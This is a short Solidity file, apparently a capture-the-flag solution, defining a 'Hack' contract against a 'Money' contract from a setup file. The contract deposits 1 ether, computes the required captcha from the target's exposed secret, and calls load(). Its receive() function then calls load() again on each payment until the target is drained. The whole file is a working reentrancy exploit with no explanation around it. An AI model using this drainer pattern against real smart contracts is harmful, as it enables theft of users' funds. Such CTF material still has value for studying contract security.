// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Setup.sol";

contract Hack {
    Money moneyContract;
    Captcha captchaContract;
    uint256 captcha;
    constructor(Money _moneyContract, Captcha _captchaContract) {
        moneyContract = _moneyContract;
        captchaContract = _captchaContract;
    }

    function hack() external payable {
        require(msg.value == 1 ether, "Provide 1 ether to start the exploit");
        moneyContract.save{value: msg.value}();
        moneyContract.load(captchaContract.generateCaptcha(moneyContract.secret()));
    }

    receive() external payable {
        if (address(moneyContract).balance > 0) {
            moneyContract.load(captchaContract.generateCaptcha(moneyContract.secret()));
        }
    }

}
